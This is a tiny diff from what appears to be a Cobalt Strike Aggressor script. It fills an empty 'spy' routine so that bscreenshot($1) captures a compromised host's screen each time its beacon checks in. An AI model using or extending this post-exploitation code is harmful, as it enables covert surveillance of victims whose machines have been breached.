@@ -23,7 +23,7 @@ set BEACON_CHECKIN{
 }
 
 sub spy{
-	
+	bscreenshot($1);
 	#spy stuff goes here
 }
 
